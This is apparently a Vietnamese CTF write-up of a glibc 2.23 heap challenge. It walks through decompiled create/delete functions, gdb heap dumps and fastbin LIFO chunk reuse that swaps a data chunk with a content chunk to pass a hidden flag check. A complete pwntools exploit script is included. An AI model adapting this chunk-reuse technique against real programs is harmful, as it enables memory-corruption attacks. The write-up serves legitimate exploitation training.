### Thông tin file:

```c
└─$ ls heap1
libc.2.23.so   pwn1_ff
```

```c
└─$ file pwn1_ff 
pwn1_ff: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.23.so, for GNU/Linux 2.6.32, BuildID[sha1]=b744398ed054457775b2ede2fc6f427f294fca56, stripped
```
```c
└─$ checksec --file=pwn1_ff  
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols   FORTIFY  Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols  No     0               2               pwn1_ff
```
* `Partial RELRO`: overwrite GOT
* `No PIE`: địa chỉ binary tĩnh

Chương trinh đang thiếu loader, nên ta dùng patchelf:
```bash
patchelf --set-interpreter ./ld-2.23.so pwn1_ff_patched
patchelf --set-rpath . pwn1_ff_patched
```

Output chương trình:

<img width="810" height="145" alt="image" src="https://github.com/user-attachments/assets/82bbb14c-712d-4920-b5aa-cd8f89d94834" />

Code từ ghidra (với các biến được đặt tên lại):
* `main()`:
```c
void main(void)
{
  int choice;
  
  init();
  puts("Ez heap challange !");
  do {
    while( true ) {
      while( true ) {
        menu();
        choice = read_input();
                    /* 1-create;2-delete;3-exit */
        if (choice != 2) break;
        delete();
      }
      if (2 < choice) break;
      if (choice == 1) {
        create();
      }
      else {
LAB_00400d2a:
        puts("no option");
      }
    }
    if (choice == 3) {
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    if (choice != 4) goto LAB_00400d2a;
    flag_check();
  } while( true );
}
```
* Có hidden option 4 để kích hoạt `get_flag()`:
  ```
  if (choice != 4) goto LAB_00400d2a;
  flag_check();
  ```
  
`create()`:
```c
undefined8 create(void)
{
  uint size;
  data *data;
  char *content;
  int i;
  
  for (i = 0; (i < 9 && ((&database)[i] != (data *)0x0)); i = i + 1) {
  }
  printf("Input size:");
  size = read_input();
  if (size < 4097) {
    data = (data *)malloc(0x10);
    content = (char *)malloc((ulong)size);
    data->content = content;
    (&database)[i] = data;
    printf("Input data:");
    read(data->content,size);
    return 0;
  }
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```
* có `database` (là `DAT_006020e0` lúc trước) là vùng nhớ trên binary `.bss`, chứa các pointer `data` từ 0 đến 8
* có `data` là vùng nhớ được cấp phát động trên heap để chứa pointer trỏ đến chunk của `content` cũng được cấp phát động theo `size` do người dùng đặt
* có `size` tối đa = `4096`, có thể tận dụng cho **heap overflow**
`delete()`:
```c
undefined8 delete(void)
{
  int index;
  undefined *ptr;
  
  printf("Input index:");
  index = read_input();
  if ((index < 10) && (-1 < index)) {
    if ((&database)[index] != (data *)0x0) {
      ptr = (&database)[index]->content;
      free((&database)[index]);
      free(ptr);
      (&database)[index]->content = (undefined *)0x0;
      (&database)[index] = (data *)0x0;
      puts("Done ");
    }
    return 0;
  }
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```
* có `free()` phần chunk của `content` chứa userdata mình nhập vào ("Input data:")
* có `free()` phần chunk của `data` chứa pointer đến chunk của `content`
* sau đấy reset lại con trỏ trong chunk data và value trong chunk content thành 0:
  ```
  (&database)[index]->content = (undefined *)0x0;
  (&database)[index] = (data *)0x0;
  ``` 

`flag_check()`:
```c
undefined8 flag_check(void)

{
  if ((DAT_006020f0 != 0) && (*(long *)(DAT_006020f0 + 8) == 0xabcdef)) {
    get_flag();
  }
  return 0;
}
```
* có `DAT_006020f0` là vùng nhớ trên heap cận kề vùng `database` (`DAT_006020e0`), với:
	* `DAT_006020f0` là `database[2]` (DAT_006020e0 + 16)
 	* `DAT_006020f0 + 8` là `database[2] + 8` (DAT_006020e0 + 24)

<img width="695" height="447" alt="image" src="https://github.com/user-attachments/assets/4b9b37f5-5382-40d6-9b99-f3e132183f2c" />

* điều kiện để có flag là:
  ```
  DAT_006020f0 != 0
  DAT_006020f0 + 8 == 0xabcdef
  ```

___
### exploit:
* chương trình có 2 chức năng chính: `create()` và `delete()`, ta tạo:
  ```
	def create(size, data):
		p.sendlineafter(b">", b"1")
		p.sendlineafter(b"size:", size)
		p.sendafter(b"data:", data)
	
	def delete(index):
		p.sendlineafter(b">", b"2")
		p.sendlineafter(b"index:", index)
  ```
* bởi vì `create()` tạo chunk và lưu theo thứ tự index 0 -> 8, mà chunk `get_flag()` check ở index 2
* tạo đệm trước hai chunk lớn đầu: 0, 1

  [heap1](https://github.com/geetHup9n0L/trainee_assignments/blob/main/task4%3A%20heap/images/heap1/heap1.png)

  heap2

  heap3

* có chunk `data` mặc định 32 byte (0x20):
  * 0x10 bytes đầu là metadata
  * 0x10 bytes tiếp là chunkdata, và chỉ có 8 bytes đầu là sử dụng để chứa con trỏ (trỏ đến chunk content / trỏ đến freed chunk khác trong bin)
	```
	0x182c000:      0x0000000000000000      0x0000000000000021 <== metadata		|
	0x182c010:      0x000000000182c030      0x0000000000000000 <== chunkdata	| => chunk data
	0x182c020:      0x0000000000000000      0x0000000000000031	||
	0x182c030:      0x4141414141414141      0x0000000000000000	|| 
	0x182c040:      0x0000000000000000      0x0000000000000000	|| => chunk content
  	```
  * vì vậy, khi `delete` giải phóng chunk, 8 bytes sau hoặc cuối của chunkdata là không bị thay đổi
  * và phần chunkdata của chunk `data` thứ 3 (hay database[2]) này là chỗ `flag_test` kiểm tra điều kiện
	```
	DAT_006020f0 != 0
	DAT_006020f0 + 8 == 0xabcdef
	```
   	hay giả sử theo ví dụ trên:
    ```
    DAT_006020f0: 		0x182c010
    DAT_006020f0 + 8:	0x182c018
    ``` 
* nhưng mà khi `create()`, chunk `data` ko write được, có mỗi chunk `content` là writable thông qua:
  ```
  read(data->content,size);
  ```
  có cách đó là: ta write giá trị yêu cầu của `get_flag()` vào chunk `content` trước, sau đó hoán đổi 2 chunks này (hoán đổi vai trò)

* các bước:
  * `create()` chunk lớn thứ 3  
  * tạo size của chunk `content` = size của chunk `data` (= 0x20)
    ```
    ...
	0x182c090       0x0000000000000000      0x0000000000000021      ........!.......
	0x182c0a0       0x0000000000000000      0x0000000000000000      ................
	0x182c0b0       0x0000000000000000      0x0000000000000021      ........!.......
	0x182c0c0       0x0000000000000000      0x0000000000000000      ................
	0x182c0d0       0x0000000000000000      0x0000000000020f31      ........1.......         <-- Top chunk
    ```
    điền giá trị yêu cầu của `get_flag()` trước vào chunk `content`:
    ```
    ...
	0x182c090       0x0000000000000000      0x0000000000000021      ........!.......
	0x182c0a0       0x000000000182c0c0      0x0000000000000000      ................
	0x182c0b0       0x0000000000000000      0x0000000000000021      ........!.......
	0x182c0c0       0x00000000deadbeef      0x0000000000abcdef      ................
	0x182c0d0       0x0000000000000000      0x0000000000020f31      ........1.......         <-- Top chunk
    ```
    
	heap4

  * khi `delete()` chunk lớn thứ 3, cả 2 chunk con đều được đưa vào fastbin, chung một list (=0x20)

	heap5

	```
	0x182c090       0x0000000000000000      0x0000000000000021      ........!.......         <-- fastbins[0x20][1]
	0x182c0a0       0x0000000000000000      0x0000000000000000      ................
	0x182c0b0       0x0000000000000000      0x0000000000000021      ........!.......         <-- fastbins[0x20][0]
	0x182c0c0       0x000000000182c090      0x0000000000abcdef      ................
	0x182c0d0       0x0000000000000000      0x0000000000020f31  
  	```
  	* để ý, sau khi free, giá trị `0x0000000000abcdef` ở chunk content vẫn giữ nguyên

	heap6
	
	```
	pwndbg> fastbins
	fastbins
	0x20: 0x182c0b0 —▸ 0x182c090 ◂— 0
  	```
	đúng theo thứ tự `free()`: chunk `data` vào bin trước, sau đó chunk `content` vào bin trỏ đến chunk `data` 
	```
      ptr = (&database)[index]->content;
      free((&database)[index]);
      free(ptr);
  	```
  * bug bắt đầu ở đây, thuật toán heap bins theo là **LIFO (Last in First out)**: nghĩa là chunk cuối cùng được freed là chunk đầu tiên được tái sử dụng nếu có lệnh malloc() (cùng size)
    khi gọi lại `create()`:
    ```
    data = (data *)malloc(0x10);
    content = (char *)malloc((ulong)size);
    ```
    * `malloc()` của `data` đầu tiên sẽ lấy `0x182c0b0` từ fastbin (hay là chunk `content` trước đó)
   
    heap7
 
    heap8
 
    * `malloc()` của `content` với size đặt=0x20 sau đấy sẽ lấy `0x182c090` còn lại từ fastbin (là chunk `data` trước đó)
    
	heap9

	heap10

  * Khi chọn option 4 để `get_flag` kiểm tra điều kiện tại `database[2]`, khi đấy là:
    ```
	0x182c090       0x0000000000000000      0x0000000000000021      ........!.......	||
	0x182c0a0       0x4444444444444444      0x0000000000000000      DDDDDDDD........	|| => chunk `content`
	0x182c0b0       0x0000000000000000      0x0000000000000021      ........!....... => metadata	|
	0x182c0c0       0x000000000182c0a0      0x0000000000abcdef      ................ => chunkdata 	| => chunk `data`
    ```
	```
	database[2]: 0x182c0c0 (pointer trỏ đến data thứ 3) 
  	```
  	```
	0x182c0c0 != 0
	0x182c0c8 == 0xabcdef
	```
   	* tại `[0x182c0c0]` lại chứa con trỏ đến chunk `content` nên thỏa mãn khác 0

	heap11
___
`script.py`:
```python
from pwn import *

libc = ELF("./libc.2.23.so", checksec=False)

context.binary = exe = ELF("./pwn1_ff_patched", checksec=False)
context.log_level = "debug"

def GDB():
	gdb.attach(p, gdbscript='''
		handle SIGALRM ignore
		# main
		br *0x400ca9
		# create
		br *0x400aa2
		br *0x400b06
		# delete
		br *0x400b67
		br *0x400bde

		# heap check:
		# heap [-v]
		# vis
		# vmmap
		# x/4gx 0x006020e0
		''')

p = process(exe.path)
GDB()

def create(size, data):
	p.sendlineafter(b">", b"1")
	p.sendlineafter(b"size:", size)
	p.sendafter(b"data:", data)

def delete(index):
	p.sendlineafter(b">", b"2")
	p.sendlineafter(b"index:", index)

create(b'32', b'A'*8)
create(b'16', b'B'*8)
create(b'16', p64(0xdeadbeef) + p64(0x00abcdef))
delete(b'2')
create(b'16', b'D'*8)

# get_flag():
p.sendlineafter(b'>', b'4')

# database: 0x006020e0
# flag_check: DAT_006020f0: != 0
# flag_check: DAT_006020f0 + 8: 0xabcdef

p.interactive()
```
___
Lấy đúng bản loader tương ứng libc được cấp 
```c
wget http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu11.3_amd64.deb
```
```c
# Extract the package
ar x libc6_2.23-0ubuntu11.3_amd64.deb

# Extract the data folder inside it
tar -xf data.tar.xz

# Find the loader and copy it to your current folder
cp lib/x86_64-linux-gnu/ld-2.23.so .
```
```c
# 1. Tell the binary: "Use this specific loader"
patchelf --set-interpreter ./ld-2.23.so pwn1_ff_patched

# 2. Tell the binary: "Look for libraries in the current folder"
patchelf --set-rpath . pwn1_ff_patched

# 3. Ensure the library name matches what the binary expects
cp libc.2.23.so libc.so.6
```
___
doc:

https://www.youtube.com/watch?v=aU1_PXlMBhg















